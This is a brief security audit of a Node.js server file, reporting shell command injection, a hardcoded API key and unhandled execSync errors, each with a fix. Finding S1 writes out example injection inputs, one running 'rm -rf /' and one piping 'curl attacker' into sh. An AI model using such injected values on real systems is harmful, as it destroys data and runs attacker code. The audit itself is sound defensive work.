# Security Audit — src/server.mjs

## S1. Shell command injection in `findUser` (line 7) — Critical
```js
return execSync(`grep -r "${name}" ./data/users.txt`).toString();
```
`name` is interpolated directly into a shell command. Any caller-controlled value can break out of the quotes and execute arbitrary commands, e.g. `name = '" ; rm -rf / ; echo "'` or `$(curl attacker | sh)`. Backticks and `$()` execute even inside double quotes, so quoting alone does not help.
Fix: use `execFile("grep", [pattern, file])` (no shell), or better, read the file in Node and match in JS.

## S2. Hardcoded live secret (line 3) — High
```js
const API_KEY = "sk-live-9f8e7d6c5b4a"; // hardcoded secret
```
A production-looking (`sk-live-`) API key is committed in source. Anyone with repo access (or the published package) gets the credential. It is also never used, so it leaks value for nothing.
Fix: remove it, rotate the key, load secrets from the environment or a secret store.

## S3. Unhandled `execSync` failure in `findUser` (line 7) — Medium
`grep` exits with status 1 when there is no match; `execSync` then throws. `findUser` has no error handling, so a perfectly normal "user not found" lookup throws an exception that, if reached from a request path, crashes or 500s the process — a trivial availability/DoS issue, and the thrown error message echoes the full shell command (information disclosure).
Fix: catch the error / check exit status; distinguish "no match" from real failure.
